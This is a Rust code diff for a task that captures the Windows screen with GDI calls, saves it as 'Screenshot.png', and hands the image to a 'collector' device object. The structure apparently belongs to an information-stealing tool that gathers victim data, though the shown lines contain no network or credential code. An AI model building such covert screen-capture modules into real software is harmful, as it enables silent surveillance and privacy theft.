@@ -8,7 +8,7 @@ use filesystem::path::Path;
 use miniz_oxide::deflate::compress_to_vec_zlib;
 use tasks::{parent_name, Task};
 
-use collector::Collector;
+use collector::{Collector, Device};
 use filesystem::{FileSystem, WriteTo};
 use windows_sys::Win32::Graphics::Gdi::{
     BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateDCW, DeleteDC, DeleteObject,
@@ -23,13 +23,15 @@ pub(super) struct ScreenshotTask;
 impl<C: Collector, F: FileSystem> Task<C, F> for ScreenshotTask {
     parent_name!("Screenshot.png");
 
-    fn run(&self, parent: &Path, filesystem: &F, _: &C) {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let Ok((width, height, pixels)) = capture_screen() else {
             return;
         };
 
         let png = create_png(width as u32, height as u32, &pixels);
-        let _ = png.write_to(filesystem, parent);
+        let _ = &png.write_to(filesystem, parent);
+
+        collector.get_device().set_screenshot(png);
     }
 }
 
